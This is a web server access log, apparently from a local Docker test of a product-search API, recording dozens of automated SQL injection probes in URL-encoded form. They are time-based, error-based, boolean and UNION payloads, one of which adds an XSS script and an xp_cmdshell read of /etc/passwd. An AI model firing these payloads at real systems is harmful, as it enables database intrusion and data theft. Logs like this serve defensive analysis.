api-1  | INFO:     Started server process [1]
api-1  | INFO:     172.18.0.1:51084 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F9594%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289594%3D9594%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51092 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F9594%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289594%3D9594%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29--%2F%2A%2A%2FnPKF HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51108 - "GET /produtos/busca/?categoria=%28SELECT%2F%2A%2A%2FCONCAT%28CONCAT%28%27qjjxq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288053%3D8053%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qvppq%27%29%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51114 - "GET /produtos/busca/?categoria=teste%27%29%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51128 - "GET /produtos/busca/?categoria=teste%27%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51136 - "GET /produtos/busca/?categoria=teste%29%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51144 - "GET /produtos/busca/?categoria=teste%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51158 - "GET /produtos/busca/?categoria=teste%27%29%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51162 - "GET /produtos/busca/?categoria=teste%27%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51176 - "GET /produtos/busca/?categoria=teste%29%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51190 - "GET /produtos/busca/?categoria=teste%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51200 - "GET /produtos/busca/?categoria=teste%27%29%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28108%29%7C%7CCHR%2872%29%7C%7CCHR%28101%29%7C%7CCHR%2884%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51216 - "GET /produtos/busca/?categoria=teste%27%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28108%29%7C%7CCHR%2872%29%7C%7CCHR%28101%29%7C%7CCHR%2884%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51222 - "GET /produtos/busca/?categoria=teste%29%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28108%29%7C%7CCHR%2872%29%7C%7CCHR%28101%29%7C%7CCHR%2884%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51232 - "GET /produtos/busca/?categoria=teste%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28108%29%7C%7CCHR%2872%29%7C%7CCHR%28101%29%7C%7CCHR%2884%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51246 - "GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F3233%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29lOAQ%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27qCtG%27%3D%27qCtG HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51250 - "GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F3233%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29lOAQ%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27Ytgp%27%3D%27Ytgp HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51260 - "GET /produtos/busca/?categoria=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F3233%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29lOAQ%29%2F%2A%2A%2FAND%2F%2A%2A%2F%284323%3D4323 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51276 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F3233%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29lOAQ%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51284 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F3233%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29lOAQ%29--%2F%2A%2A%2Fvpkz HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51258 - "GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F1745%3D%28SELECT%2F%2A%2A%2F1745%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27Albh%27%3D%27Albh HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51288 - "GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F1745%3D%28SELECT%2F%2A%2A%2F1745%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27JLQU%27%3D%27JLQU HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51290 - "GET /produtos/busca/?categoria=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F1745%3D%28SELECT%2F%2A%2A%2F1745%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%284685%3D4685 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51296 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F1745%3D%28SELECT%2F%2A%2A%2F1745%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51302 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F1745%3D%28SELECT%2F%2A%2A%2F1745%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29--%2F%2A%2A%2FDThe HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51312 - "GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27mApX%27%3D%27mApX HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51326 - "GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%27mFQP%27%3D%27mFQP HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51340 - "GET /produtos/busca/?categoria=teste%29%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%288631%3D8631 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51356 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51314 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27--%2F%2A%2A%2FlVVb HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51358 - "GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F2738%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2897%29%7C%7CCHR%2876%29%7C%7CCHR%28110%29%7C%7CCHR%2889%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27SdMh%27%3D%27SdMh HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51362 - "GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F2738%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2897%29%7C%7CCHR%2876%29%7C%7CCHR%28110%29%7C%7CCHR%2889%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27cgka%27%3D%27cgka HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51364 - "GET /produtos/busca/?categoria=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F2738%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2897%29%7C%7CCHR%2876%29%7C%7CCHR%28110%29%7C%7CCHR%2889%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%282818%3D2818 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51370 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F2738%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2897%29%7C%7CCHR%2876%29%7C%7CCHR%28110%29%7C%7CCHR%2889%29%2C5%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51372 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F2738%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2897%29%7C%7CCHR%2876%29%7C%7CCHR%28110%29%7C%7CCHR%2889%29%2C5%29--%2F%2A%2A%2FVkKL HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51368 - "GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FJwXg HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51384 - "GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F2768--%2F%2A%2A%2FXsRv HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51388 - "GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FhoRq HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51400 - "GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F3265--%2F%2A%2A%2FAFEY HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51414 - "GET /produtos/busca/?categoria=teste%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FbNfa HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51416 - "GET /produtos/busca/?categoria=teste%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F3807--%2F%2A%2A%2FFvvC HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51432 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FbfsQ HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51448 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F5157--%2F%2A%2A%2FUWCH HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51460 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FpycN HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51462 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F4472--%2F%2A%2A%2Fjmwi HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51472 - "GET /produtos/busca/?nome=teste&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51474 - "GET /produtos/busca/?nome=teste&categoria=eletronicos&XVUZ=4994%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51480 - "GET /produtos/busca/?nome=teste&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51482 - "GET /produtos/busca/?nome=3415&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51486 - "GET /produtos/busca/?nome=teste%2C%2C%29%29%22%28%28%2C%2C%27&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51494 - "GET /produtos/busca/?nome=teste%27QuYRKP%3C%27%22%3EdTGSqn&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51500 - "GET /produtos/busca/?nome=teste&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51516 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F6716%3D9177%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27TOuj%27%3D%27TOuj&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51526 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F6720%3D8565%2F%2A%2A%2FAND%2F%2A%2A%2F%27cbZi%27%3D%27cbZi&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51538 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F6821%3D9582%2F%2A%2A%2FAND%2F%2A%2A%2F%283686%3D3686&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51546 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F3859%3D9226&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51560 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F4557%3D8962--%2F%2A%2A%2FubPI&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51582 - "GET /produtos/busca/?nome=%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%287515%3D8442%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%27teste%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F8442%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F8382%29%2F%2A%2A%2FEND%29%29&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51594 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%289858%2CCONCAT%280x5c%2C0x717a6a6a71%2C%28SELECT%2F%2A%2A%2F%28ELT%289858%3D9858%2C1%29%29%29%2C0x716a717871%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27Ogcp%27%3D%27Ogcp&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51568 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%289858%2CCONCAT%280x5c%2C0x717a6a6a71%2C%28SELECT%2F%2A%2A%2F%28ELT%289858%3D9858%2C1%29%29%29%2C0x716a717871%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27hOIl%27%3D%27hOIl&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51602 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%289858%2CCONCAT%280x5c%2C0x717a6a6a71%2C%28SELECT%2F%2A%2A%2F%28ELT%289858%3D9858%2C1%29%29%29%2C0x716a717871%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%281060%3D1060&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51618 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%289858%2CCONCAT%280x5c%2C0x717a6a6a71%2C%28SELECT%2F%2A%2A%2F%28ELT%289858%3D9858%2C1%29%29%29%2C0x716a717871%29%29&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51634 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%289858%2CCONCAT%280x5c%2C0x717a6a6a71%2C%28SELECT%2F%2A%2A%2F%28ELT%289858%3D9858%2C1%29%29%29%2C0x716a717871%29%29--%2F%2A%2A%2FSLHZ&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51636 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F8872%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288872%3D8872%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27oCza%27%3D%27oCza&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51642 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F8872%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288872%3D8872%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27ABxA%27%3D%27ABxA&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51644 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F8872%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288872%3D8872%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%283409%3D3409&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51656 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F8872%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288872%3D8872%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51664 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F8872%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288872%3D8872%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29--%2F%2A%2A%2FswJB&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51672 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F5793%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285793%3D5793%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27ocqW%27%3D%27ocqW&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51686 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F5793%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285793%3D5793%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27pzhc%27%3D%27pzhc&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51698 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F5793%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285793%3D5793%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%287708%3D7708&categoria=eletronicos HTTP/1.1" 200 OK
